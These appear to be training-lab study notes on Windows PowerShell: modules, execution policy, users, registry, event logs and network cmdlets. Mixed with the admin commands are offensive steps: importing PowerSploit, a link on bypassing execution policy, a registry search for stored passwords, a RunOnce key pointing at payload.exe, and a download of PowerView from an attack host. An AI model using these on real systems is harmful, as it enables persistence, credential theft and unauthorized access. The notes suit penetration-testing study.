
```powershell
Get-Command -verb get
Get-Command -noun windows*
Get-History
```

## Powersploit

https://github.com/PowerShellMafia/PowerSploit
### PowerSploit.psd1
A PowerShell data file (`.psd1`) is a [Module manifest file](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_module_manifests?view=powershell-7.2). Contained in a manifest file we can often find:
- Reference to the module that will be processed
- Version numbers to keep track of major changes
- The GUID
- The Author of the module
- Copyright
- PowerShell compatibility information
- Modules & cmdlets included
- Metadata
### PowerSploit.psm1
A PowerShell script module file (`.psm1`) is simply a script containing PowerShell code. Think of this as the meat of a module.

#### Using Import-Module

The [Import-Module](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/import-module?view=powershell-7.2) cmdlet allows us to add a module to the current PowerShell session.
```powershell
Import-Module .\PowerSploit.psd1
```

To understand the idea of importing the module into our current PowerShell session, we can attempt to run a cmdlet (`Get-NetLocalgroup`) that is part of PowerSploit. We will get an error message when attempting to do this without importing a module. Once we successfully import the PowerSploit module (it has been placed on the target host's Desktop for our use), many cmdlets will be available to us, including Get-NetLocalgroup. See this in action in the clip below:

## Execution Policy

An essential factor to consider when attempting to use PowerShell scripts and modules is [PowerShell's execution policy](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2). An execution policy is not a security control. It is designed to give IT admins a tool to set parameters and safeguards for themselves.
#### Checking Execution Policy State
```powershell
Get-ExecutionPolicy
```
#### Setting Execution Policy
```powershell
Set-ExecutionPolicy undefined
```
By setting the policy to undefined, we are telling PowerShell that we do not wish to limit our interactions.
#### Change Execution Policy By Scope
```powershell
Set-ExecutionPolicy -scope Process
Get-ExecutionPolicy -list
```
By changing it at the Process level, our change will revert once we close the PowerShell session. Keep the execution policy in mind when working with scripts and new modules. Of course, we want to look at the scripts we are trying to load first to ensure they are safe for use.
# 15 Ways to Bypass the PowerShell Execution Policy
https://www.netspi.com/blog/technical-blog/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/
### Calling Cmdlets and Functions From Within a Module
```powershell
Get-Command -Module PowerSploit
```
## Adding/Removing/Editing User Accounts & Groups
```powershell
Get-LocalUser
#### Creating A New User
New-LocalUser -Name "JLawrence" -NoPassword
#### Modifying a User
$Password = Read-Host -AsSecureString
Set-LocalUser -Name "JLawrence" -Password $Password -Description "CEO EagleFang"
### Get-LocalGroup
Get-LocalGroup
#### Adding a Member To a Group
Add-LocalGroupMember -Group "Remote Desktop Users" -Member "JLawrence"
Get-LocalGroupMember -Name "Remote Desktop Users"
```


## How Do We Access the Information? REGISTER

From the CLI, we have several options to access the Registry and manage our keys. The first is using [reg.exe](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg). `Reg` is a dos executable explicitly made for use in managing Registry settings. The second is using the `Get-Item` and `Get-ItemProperty` cmdlets to read keys and values. If we wish to make a change, the use of New-ItemProperty will do the trick.

```powershell
Get-Item -Path Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run | Select-Object -ExpandProperty Property

Get-ChildItem -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion -Recurse Hive: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths

Get-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

#### Reg.exe
```powershell
PS C:\htb> reg query HKEY_LOCAL_MACHINE\SOFTWARE\7-Zip
# Finding Info In The Registry
REG QUERY HKCU /F "Password" /t REG_SZ /S /K
# New Registry Key
New-Item -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\ -Name TestKey
# Set New Registry Item Property
New-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\TestKey -Name "access" -PropertyType String -Value "C:\Users\htb-student\Downloads\payload.exe"
# Delete Reg properties
Remove-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\TestKey -Name "access"
```

## Interacting with the Windows Event Log - wevtutil
```powershell
# Wevtutil without Parameters
wevtutil /?
# Enumerating Log Sources
wevtutil el
# Gathering Log Information
wevtutil gl "Windows PowerShell"
wevtutil gli "Windows PowerShell"
# Querying Events
wevtutil qe Security /c:5 /rd:true /f:text
```

## Interacting with the Windows Event Log - PowerShell

```powershell
#### PowerShell - Listing All Logs
Get-WinEvent -ListLog *
#### Security Log Details
Get-WinEvent -ListLog Security
#### Querying Last Five Events
Get-WinEvent -LogName 'Security' -MaxEvents 5 | Select-Object -ExpandProperty Message
#### Filtering for Logon Failures
Get-WinEvent -FilterHashTable @{LogName='Security';ID='4625 '}
Get-WinEvent -FilterHashTable @{LogName='System';Level='1'} | select-object -ExpandProperty Message
```

#### Downloading PowerView.ps1 from Web Server (From Attack Host to Target Host)
```powershell
Invoke-WebRequest -Uri "http://10.10.14.169:8000/PowerView.ps1" -OutFile "C:\PowerView.ps1"
```

#### Net Cmdlets

|**Cmdlet**|**Description**|
|---|---|
|`Get-NetIPInterface`|Retrieve all `visible` network adapter `properties`.|
|`Get-NetIPAddress`|Retrieves the `IP configurations` of each adapter. Similar to `IPConfig`.|
|`Get-NetNeighbor`|Retrieves the `neighbor entries` from the cache. Similar to `arp -a`.|
|`Get-Netroute`|Will print the current `route table`. Similar to `IPRoute`.|
|`Set-NetAdapter`|Set basic adapter properties at the `Layer-2` level such as VLAN id, description, and MAC-Address.|
|`Set-NetIPInterface`|Modifies the `settings` of an `interface` to include DHCP status, MTU, and other metrics.|
|`New-NetIPAddress`|Creates and configures an `IP address`.|
|`Set-NetIPAddress`|Modifies the `configuration` of a network adapter.|
|`Disable-NetAdapter`|Used to `disable` network adapter interfaces.|
|`Enable-NetAdapter`|Used to turn network adapters back on and `allow` network connections.|
|`Restart-NetAdapter`|Used to restart an adapter. It can be useful to help push `changes` made to adapter `settings`.|
|`test-NetConnection`|Allows for `diagnostic` checks to be ran on a connection. It supports ping, tcp, route tracing, and more.|
#### PowerShell Extensions

| **Extension** | **Description**                                                                                                                 |
| ------------- | ------------------------------------------------------------------------------------------------------------------------------- |
| ps1           | The `*.ps1` file extension represents executable PowerShell scripts.                                                            |
| psm1          | The `*.psm1` file extension represents a PowerShell module file. It defines what the module is and what is contained within it. |
| psd1          | The `*.psd1` is a PowerShell data file detailing the contents of a PowerShell module in a table of key/value pairs.             |